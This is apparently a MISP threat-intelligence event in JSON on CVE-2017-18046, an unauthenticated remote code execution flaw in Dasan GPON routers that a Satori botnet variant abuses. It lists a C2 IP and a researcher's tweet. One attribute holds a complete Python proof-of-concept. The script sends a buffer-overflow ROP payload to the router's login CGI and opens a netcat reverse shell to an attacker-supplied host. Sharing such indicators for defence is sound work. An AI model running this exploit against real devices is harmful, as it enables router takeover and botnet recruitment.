{
    "Event":{
        "threat_level_id":"3",
        "date":"2018-02-11",
        "published":true,
        "info":"OSINT - Dasan Unauthenticated Remote Code Execution - and ongoing abuse",
        "publish_timestamp":"1518772005",
        "timestamp":"1518404418",
        "Tag":[
            {
                "name":"tlp:white"
            },
            {
                "name":"misp-galaxy:tool=\"Mirai\""
            },
            {
                "name":"misp-galaxy:tool=\"Satori\""
            }
        ],
        "Attribute":[
            {
                "category":"External analysis",
                "comment":"",
                "timestamp":"1518355147",
                "type":"link",
                "value":"https://blogs.securiteam.com/index.php/archives/3552",
                "to_ids":false
            },
            {
                "category":"External analysis",
                "comment":"",
                "timestamp":"1518355162",
                "type":"text",
                "value":"The following advisory describes a buffer overflow that leads to remote code execution found in Dasan Networks GPON ONT WiFi Router H640X versions 12.02-01121 / 2.77p1-1124 / 3.03p2-1146\r\n\r\nDasan Networks GPON ONT WiFi Router â€œis indoor type ONT dedicated for FTTH (Fibre to the Home) or FTTP (Fiber to the Premises) deployments. That can work as simple Bridge or behave as Router/NAT. Itâ€™s cost-effective CPE that meets carrier-class requirement for Telcom industry and guarantee reliable service proven in the field.â€",
                "to_ids":false
            },
            {
                "category":"Support Tool",
                "comment":"Proof of Concept",
                "timestamp":"1518355218",
                "type":"text",
                "value":"import sys\r\nimport socket\r\nimport json\r\nimport time\r\nimport struct\r\nimport ssl\r\n\r\nif len(sys.argv) != 4:\r\n    print \"Use: {} ip port connectback\".format(sys.argv[0])\r\n    sys.exit(1)\r\n\r\nhost = str(sys.argv[1])\r\nport = int(sys.argv[2])\r\n\r\nconnectback = str(sys.argv[3])\r\n\r\nbuf = 1024\r\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n#sock.settimeout(10)\r\n\r\nclientsocket = ssl.wrap_socket(sock)\r\n#clientsocket = sock\r\nclientsocket.connect((host, port))\r\n\r\naddr_libc = 0x2ad0c000 # 0x2ad0e000 with H640DW\r\n\r\n# rop1\r\nrop1 = addr_libc + 0x00115d40       #addiu $a0,$sp,0x18 |  jalr  $s0\r\naddr_rop1 = struct.pack(\">i\",rop1)\r\n#rop2\r\nsystem = addr_libc + 0x0003CC9C     #system\r\naddr_system =  struct.pack(\">i\",system)\r\n\r\n# execute command\r\ncommand = \"nc \" + connectback + \" -e /bin/sh;\"\r\n\r\npayload = \"A\"*(756 - 0x28) + addr_system + 'C'*(0x28-8) + addr_rop1 + ';'*24 + command\r\n\r\ndata = \"action={}&txtUserId=a&button=Login&txtPassword=a&sle_Language=english\\r\\n\".format(payload)\r\n\r\nhttp_payload = \"\"\"POST /cgi-bin/login_action.cgi HTTP/1.1\\r\\nHost: 192.168.1.100:8080\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\nAccept-Language: en-US,en;q=0.5\\r\\nAccept-Encoding: gzip, deflate\\r\\nReferer: https://192.168.1.100:8080/cgi-bin/login.cgi\\r\\nConnection: keep-alive\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: {}\\r\\n\\r\\n{}\"\"\".format(len(data),data)\r\n\r\nprint http_payload\r\n\r\nclientsocket.send(http_payload)\r\n\r\nrespond_raw = clientsocket.recv(buf).strip()\r\n\r\nprint respond_raw\r\n\r\nrespond_raw = clientsocket.recv(buf).strip()\r\n\r\nprint respond_raw\r\nrespond_raw = clientsocket.recv(buf).strip()\r\n\r\nprint respond_raw\r\n\r\nclientsocket.close()",
                "to_ids":false
            },
            {
                "category":"Payload delivery",
                "comment":"",
                "timestamp":"1518355249",
                "type":"vulnerability",
                "value":"CVE-2017-18046",
                "to_ids":false
            },
            {
                "category":"Network activity",
                "comment":"C2 (download of the first stage)",
                "timestamp":"1518355285",
                "type":"ip-dst",
                "value":"185.62.188.88",
                "to_ids":true
            }
        ],
        "Object":[
            {
                "comment":"",
                "description":"Microblog post like a Twitter tweet or a post on a Facebook wall.",
                "meta-category":"misc",
                "name":"microblog",
                "timestamp":"1518355428",
                "Attribute":[
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1518355428",
                        "type":"text",
                        "value":"So a brand new satori variant is causing port 8080 spike, it is looking for this new vulnerability https://blogs.securiteam.com/index.php/archives/3552 â€¦ (CVE-2017-18046) , device affected \"Dasan GPON ONT WiFi Router\", new C2 is 185.62.188.88",
                        "to_ids":false
                    },
                    {
                        "category":"Other",
                        "comment":"",
                        "timestamp":"1518355429",
                        "type":"text",
                        "value":"Twitter",
                        "to_ids":false
                    },
                    {
                        "category":"External analysis",
                        "comment":"",
                        "timestamp":"1518355429",
                        "type":"url",
                        "value":"https://twitter.com/360Netlab/status/962521516352077824",
                        "to_ids":true
                    }
                ]
            }
        ]
    }
}